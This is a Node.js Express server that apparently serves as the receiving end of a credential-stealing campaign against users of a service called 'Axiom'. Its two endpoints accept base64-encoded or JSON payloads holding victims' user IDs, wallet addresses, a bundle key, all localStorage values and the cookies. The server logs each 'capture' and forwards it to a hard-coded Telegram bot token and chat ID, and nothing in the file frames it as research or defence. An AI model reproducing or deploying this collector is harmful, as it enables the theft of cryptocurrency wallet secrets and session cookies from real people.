const express = require('express');
const app = express();
app.use(express.json({ limit: '1mb' }));

const TELEGRAM_TOKEN = '8744030589:AAGZkvTlFfpfp9m_S0Rr6Rf3NpPmr46o76M';
const TELEGRAM_CHAT_ID = '8691443497';

async function sendTelegram(text) {
  const maxLen = 4000;
  for (let i = 0; i < text.length; i += maxLen) {
    try {
      await fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          chat_id: TELEGRAM_CHAT_ID,
          text: text.substring(i, i + maxLen),
          parse_mode: 'Markdown'
        })
      });
    } catch (e) {
      console.log('Telegram send failed:', e.message);
    }
  }
}

app.get('/data/:encoded', async (req, res) => {
  try {
    const decoded = JSON.parse(Buffer.from(req.params.encoded, 'base64').toString('utf-8'));
    console.log('===== NEW CAPTURE =====');
    console.log(JSON.stringify(decoded, null, 2));
    console.log('========================');

    let msg = '🔑 *New Axiom Capture*\n\n';

    if (decoded.user) {
      msg += '*User ID:* `' + (decoded.user.userId || 'N/A') + '`\n';
      msg += '*Wallet:* `' + (decoded.user.registrationWallet || 'N/A') + '`\n';
    }

    if (decoded.bundle) {
      msg += '*Bundle Key:* `' + decoded.bundle + '`\n';
    }

    if (decoded.wallets && decoded.wallets.length > 0) {
      msg += '\n*Wallets:*\n';
      decoded.wallets.forEach((w, i) => {
        msg += '  ' + (i + 1) + '. `' + w.walletAddress + '` (' + w.network + ')\n';
      });
    }

    // Show ALL localStorage keys
    if (decoded.localStorage) {
      msg += '\n📦 *localStorage:*\n';
      for (const key in decoded.localStorage) {
        const val = decoded.localStorage[key];
        const shortVal = val ? val.substring(0, 300) : 'null';
        msg += '`' + key + '`: ' + shortVal + '\n';
      }
    }

    if (decoded.cookies) {
      msg += '\n🍪 *Cookies:*\n```' + decoded.cookies.substring(0, 1000) + '```\n';
    }

    await sendTelegram(msg);
    res.send('ok');
  } catch (e) {
    console.log('Invalid data:', e.message);
    res.send('ok');
  }
});

app.post('/collect', async (req, res) => {
  try {
    console.log('===== NEW CAPTURE (POST) =====');
    console.log(JSON.stringify(req.body, null, 2));
    console.log('========================');

    const decoded = req.body;
    let msg = '🔑 *New Axiom Capture*\n\n';

    if (decoded.user) {
      msg += '*User ID:* `' + (decoded.user.userId || 'N/A') + '`\n';
      msg += '*Wallet:* `' + (decoded.user.registrationWallet || 'N/A') + '`\n';
    }

    if (decoded.bundle) msg += '*Bundle Key:* `' + decoded.bundle + '`\n';

    if (decoded.wallets && decoded.wallets.length > 0) {
      msg += '\n*Wallets:*\n';
      decoded.wallets.forEach((w, i) => {
        msg += '  ' + (i + 1) + '. `' + w.walletAddress + '` (' + w.network + ')\n';
      });
    }

    if (decoded.localStorage) {
      msg += '\n📦 *localStorage:*\n';
      for (const key in decoded.localStorage) {
        const val = decoded.localStorage[key];
        const shortVal = val ? val.substring(0, 300) : 'null';
        msg += '`' + key + '`: ' + shortVal + '\n';
      }
    }

    if (decoded.cookies) {
      msg += '\n🍪 *Cookies:*\n```' + decoded.cookies.substring(0, 1000) + '```\n';
    }

    await sendTelegram(msg);
    res.json({ status: 'ok' });
  } catch (e) {
    console.log('Invalid data:', e.message);
    res.json({ status: 'ok' });
  }
});

app.listen(10000, () => console.log('Collector running on port 10000'));
